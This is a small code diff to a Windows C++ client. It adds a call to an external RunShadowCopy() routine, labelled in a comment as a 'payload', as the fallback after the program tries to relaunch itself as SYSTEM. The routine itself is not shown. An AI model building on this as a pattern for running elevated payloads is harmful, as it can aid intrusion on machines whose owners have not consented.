@@ -1,5 +1,6 @@
 #include "client.h"
 #include "permissions.h"
+extern int RunShadowCopy();
 #include <Windows.h>
 #include <iostream>
 #include <cstdlib>
@@ -39,8 +40,8 @@ int main() {
             // New SYSTEM instance started; exit current process
             return 0;
         }
-        // Fallback: launch console in current session
-        LaunchConsoleInSessionId();
+        // Fallback: execute the original shadow‑copy routine as a payload
+        RunShadowCopy();
     }
     return 0;
 }
